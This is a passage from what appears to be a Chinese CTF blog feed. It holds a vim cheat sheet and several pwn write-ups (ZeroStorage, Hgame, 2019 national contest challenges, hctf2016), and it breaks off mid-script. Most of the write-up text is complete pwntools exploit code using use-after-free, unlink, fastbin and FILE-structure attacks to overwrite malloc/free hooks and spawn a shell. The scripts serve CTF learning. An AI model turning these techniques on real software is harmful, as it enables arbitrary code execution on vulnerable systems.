class="number">0x70</span>)</span><br><span class="line"> add(<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'c'</span>*<span class="number">0x70</span>)</span><br><span class="line"> add(<span class="string">'d'</span>*<span class="number">8</span>,<span class="string">'d'</span>*<span class="number">0x70</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">3</span>)</span><br><span class="line"> edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line"> remove(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">2</span>)</span><br><span class="line"> edit(<span class="number">2</span>,<span class="string">'2'</span>*<span class="number">0x70</span>)</span><br><span class="line"> remove(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">1</span>)</span><br><span class="line"> edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">0</span>)</span><br><span class="line"> edit(<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line"> remove(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> show(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line"> log.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"> </span><br><span class="line"> system_addr = libc_base + <span class="number">0x52fd0</span></span><br><span class="line"> free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"> log.success(<span class="string">'free_hook: '</span>+hex( free_hook))</span><br><span class="line"> log.success(<span class="string">'system: '</span> + hex(system_addr))</span><br><span class="line"> </span><br><span class="line"> add(p64(free_hook),p64(free_hook)*<span class="number">14</span>)</span><br><span class="line"> add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'/bin/sh\x00'</span>*<span class="number">14</span>)</span><br><span class="line"> add(p64(system_addr),p64(system_addr)*<span class="number">14</span>)</span><br><span class="line"> remove(<span class="number">5</span>)</span><br><span class="line"> <span class="comment">#show(5)</span></span><br><span class="line"> sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>tcache</tag>
        <tag>double</tag>
      </tags>
  </entry>
  <entry>
    <title>自己常用的vim操作</title>
    <url>/year/02/23/cl7iordqs0064293f4v9z9jye/</url>
    <content><![CDATA[<p>备忘</p>
<a id="more"></a>
<p>首先就是自己直接用了github上的配置<br><a href="https://github.com/amix/vimrc" target="_blank" rel="noopener">https://github.com/amix/vimrc</a></p>
<h2 id="打开命令"><a href="#打开命令" class="headerlink" title="打开命令"></a>打开命令</h2><p><code>vim -O fileA fileB</code> 分屏打开</p>
<h2 id="正常模式"><a href="#正常模式" class="headerlink" title="正常模式"></a>正常模式</h2><p><code>a</code> 向后插入<br><code>o</code> 在下一行插入<br><code>u</code> 撤销<br><code>$</code> 将光标移动到行尾<br><code>gg</code> 跳转到开头<br><code>G</code> 跳转到结尾<br><code>ctrl d</code> 向下移动半屏<br><code>ctrl u</code> 向上移动半屏</p>
<h2 id="插件使用"><a href="#插件使用" class="headerlink" title="插件使用"></a>插件使用</h2><p><code>f3</code> 树状结构<br><code>Ctrl f</code> 查找文件<br><code>Ctrl v</code> 分屏打开</p>
<p><code>gt</code>  切换tab</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>近期杂七杂八的刷题</title>
    <url>/year/02/20/cl7iordqw006h293f7faz6vln/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>就是最近刷的一些简单题</p>
<a id="more"></a>

<h3 id="ZeroStrage"><a href="#ZeroStrage" class="headerlink" title="ZeroStrage"></a>ZeroStrage</h3><p>这道题就是有一个uaf，然后利用unsortedbin attack 改掉global_fast_max, 再用释放一个chunk使其覆盖IO_list_all</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./zerostorage'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Length of new entry: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Enter your data: "</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,length,data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Entry ID: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Length of entry: "</span>)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.recvuntil(<span class="string">"Enter your data: "</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Merge from Entry ID: "</span>)</span><br><span class="line">    sh.sendline(str(idx1))</span><br><span class="line">    sh.recvuntil(<span class="string">"Merge to Entry ID: "</span>)</span><br><span class="line">    sh.sendline(str(idx2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Entry ID: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Entry ID: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_fake_file</span><span class="params">(addr,vtable)</span>:</span></span><br><span class="line"></span><br><span class="line">    flag=<span class="number">0xfbad2887</span></span><br><span class="line">    <span class="comment">#flag&amp;=~4</span></span><br><span class="line">    <span class="comment">#flag|=0x800</span></span><br><span class="line">    fake_file=p64(flag)               <span class="comment">#_flags</span></span><br><span class="line">    fake_file+=p64(addr)             <span class="comment">#_IO_read_ptr</span></span><br><span class="line">    fake_file+=p64(addr)             <span class="comment">#_IO_read_end</span></span><br><span class="line">    fake_file+=p64(addr)             <span class="comment">#_IO_read_base</span></span><br><span class="line">    fake_file+=p64(addr)             <span class="comment">#_IO_write_base</span></span><br><span class="line">    fake_file+=p64(addr+<span class="number">1</span>)             <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    fake_file+=p64(addr)         <span class="comment">#_IO_write_end</span></span><br><span class="line">    fake_file+=p64(addr)                    <span class="comment">#_IO_buf_base</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                    <span class="comment">#_IO_buf_end</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_IO_save_base</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_IO_backup_base</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_IO_save_end</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_markers</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#chain   could be a anathor file struct</span></span><br><span class="line">    fake_file+=p32(<span class="number">1</span>)                       <span class="comment">#_fileno</span></span><br><span class="line">    fake_file+=p32(<span class="number">0</span>)                       <span class="comment">#_flags2</span></span><br><span class="line">    fake_file+=p64(<span class="number">0xffffffffffffffff</span>)      <span class="comment">#_old_offset</span></span><br><span class="line">    fake_file+=p16(<span class="number">0</span>)                       <span class="comment">#_cur_column</span></span><br><span class="line">    fake_file+=p8(<span class="number">0</span>)                        <span class="comment">#_vtable_offset</span></span><br><span class="line">    fake_file+=p8(<span class="number">0x10</span>)                      <span class="comment">#_shortbuf</span></span><br><span class="line">    fake_file+=p32(<span class="number">0</span>)</span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                    <span class="comment">#_lock</span></span><br><span class="line">    fake_file+=p64(<span class="number">0xffffffffffffffff</span>)      <span class="comment">#_offset</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_codecvt</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                    <span class="comment">#_wide_data</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_freeres_list</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#_freeres_buf</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)                       <span class="comment">#__pad5</span></span><br><span class="line">    fake_file+=p32(<span class="number">0xffffffff</span>)              <span class="comment">#_mode</span></span><br><span class="line">    fake_file+=p32(<span class="number">0</span>)                       <span class="comment">#unused2</span></span><br><span class="line">    fake_file+=p64(<span class="number">0</span>)*<span class="number">2</span>                     <span class="comment">#unused2</span></span><br><span class="line">    fake_file+=p64(vtable)                       <span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fake_file</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">insert(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>) <span class="comment">#0</span></span><br><span class="line">insert(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">insert(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">insert(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">merge(<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#4 -0</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#-2</span></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Entry No.4:\n"</span>)</span><br><span class="line">libc_addr = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x120</span></span><br><span class="line">global_max_fast = libc_addr + <span class="number">0x3c67f8</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">log.success(<span class="string">"libc_addr: "</span>+ hex(libc_addr))</span><br><span class="line">log.success(<span class="string">"heap_addr: "</span> + hex(heap_addr))</span><br><span class="line">log.success(<span class="string">"global_max_fast: "</span> + hex(global_max_fast))</span><br><span class="line"></span><br><span class="line">insert(<span class="number">0x50</span>,<span class="string">'a'</span>*<span class="number">0x50</span>)<span class="comment">#0</span></span><br><span class="line">insert(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment"># delete(0)#-0</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(global_max_fast<span class="number">-0x10</span>) + <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line"><span class="comment"># update(4,0x20,payload)</span></span><br><span class="line"><span class="comment"># insert(0x20,'a'*0x20)#0</span></span><br><span class="line"></span><br><span class="line">insert(<span class="number">0x1000</span>,<span class="string">'a'</span>*<span class="number">0x1000</span>)<span class="comment">#5</span></span><br><span class="line">insert(<span class="number">0x400</span>,<span class="number">0x400</span>*<span class="string">'a'</span>)<span class="comment">#6</span></span><br><span class="line">fake_file  = build_fake_file(<span class="number">0</span>,heap_addr+<span class="number">0x10</span>)</span><br><span class="line">update(<span class="number">5</span>,<span class="number">0x1000</span>,fake_file[<span class="number">0x10</span>:].ljust(<span class="number">0x1000</span>,<span class="string">'a'</span>))</span><br><span class="line">merge(<span class="number">6</span>,<span class="number">5</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">insert(<span class="number">0x1000</span>,<span class="string">'a'</span>*<span class="number">0x1000</span>)<span class="comment">#5</span></span><br><span class="line">insert(<span class="number">0x1000</span>,<span class="string">'a'</span>*<span class="number">0x1000</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">merge(<span class="number">2</span>,<span class="number">2</span>)<span class="comment">#8</span></span><br><span class="line">update(<span class="number">8</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">insert(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#-7</span></span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x50</span>,p64(one_gadget)*(<span class="number">0x50</span>/<span class="number">8</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">sh.sendline(<span class="string">'7'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Hgame-week4"><a href="#Hgame-week4" class="headerlink" title="Hgame week4"></a>Hgame week4</h3><p>这道题关闭了标准输出流，利用unlink的任意地址写覆盖stdin的后四位为stderr造成泄露</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./AN2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">"Welcome to Annevi's note2\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span>    </span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'a\n'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'a\n'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'a\n'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(buf<span class="number">-0x18</span>) + p64(buf<span class="number">-0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x70</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020A0</span>)+p64(<span class="number">0x6020E0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x40\x25'</span>+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0x3c5540</span></span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+ hex(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">one_gadget =  libc_base + <span class="number">0xf1147</span></span><br><span class="line">edit(<span class="number">1</span>,p64(malloc_hook)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.sendline(str(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2019国赛-daily"><a href="#2019国赛-daily" class="headerlink" title="2019国赛 daily"></a>2019国赛 daily</h3><p>这道的漏洞点在于free的时候没有对index进行限制，于是可以任意地址free，然后伪造chunk进行对重叠</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./daily'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ptr = <span class="number">0x602060</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.recvuntil(<span class="string">'daily\n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'daily\n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0x400</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">Add(<span class="number">0x20</span>,<span class="string">'a'</span>) <span class="comment">#1</span></span><br><span class="line">Remove(<span class="number">0</span>)</span><br><span class="line">Add(<span class="number">0x20</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">Show()</span><br><span class="line">sh.recv(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4f61</span></span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line">Change(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x11</span>)</span><br><span class="line">Show()</span><br><span class="line">sh.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(sh.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x61</span></span><br><span class="line">log.success(<span class="string">'heap_base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">fake_chunk1 = heap_base + <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="number">0x20</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x61</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(fake_chunk1)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">Add(<span class="number">0x300</span>,payload) <span class="comment">#2</span></span><br><span class="line">Add(<span class="number">0x60</span>,<span class="string">'a\n'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_idx1 = (heap_base+<span class="number">0x78</span>- <span class="number">0x602068</span>)/<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> hex(fake_idx1)</span><br><span class="line">Remove(fake_idx1)</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">malloc_hook = <span class="number">0x3c4b10</span> + libc_base - <span class="number">0x23</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="number">0x20</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(ptr+<span class="number">0x30</span> - <span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">2</span>,payload)</span><br><span class="line">Add(<span class="number">0x50</span>,<span class="string">'a\n'</span>)</span><br><span class="line">Add(<span class="number">0x50</span>, p64(free_hook))</span><br><span class="line">Change(<span class="number">3</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">Remove(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2019国赛double"><a href="#2019国赛double" class="headerlink" title="2019国赛double"></a>2019国赛double</h3><p>这道题就很简单了，就是个uaf</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eidt</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8f</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8f</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">one_gad = libc_base + <span class="number">0x4526a</span></span><br><span class="line">log.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">"malloc_hook: "</span> + hex(malloc_hook))</span><br><span class="line">add(<span class="number">0x5f</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x5f</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x1f</span>*<span class="string">'a'</span>+<span class="string">'\n'</span>) <span class="comment">#5</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">eidt(<span class="number">4</span>,p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x5f</span> + <span class="string">'\n'</span>)<span class="comment">#6</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x13</span></span><br><span class="line">payload += p64(one_gad)</span><br><span class="line">payload = payload.ljust(<span class="number">0x5f</span>,<span class="string">'c'</span>)</span><br><span class="line">add(payload + <span class="string">'\n'</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hctf2016"><a href="#hctf2016" class="headerlink" title="hctf2016"></a>hctf2016</h3><p>这道题就是通过堆上的操作可以拿到控制流，然后再在栈上构造rop链</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"3.quit\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"create "</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Pls give string size:"</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'str:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"3.quit\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"delete "</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Pls give me the string id you want to delete\nid:"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">"Are you sure?:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line"><span class="comment">#直接改后三位为puts泄露pie基地址</span></span><br><span class="line">Create(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>)   <span class="comment">#0</span></span><br><span class="line">Create(<span class="number">4</span>,<span class="string">'b'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>)   <span class="comment">#1</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span></span><br><span class="line">payload += <span class="string">'\x0b'</span></span><br><span 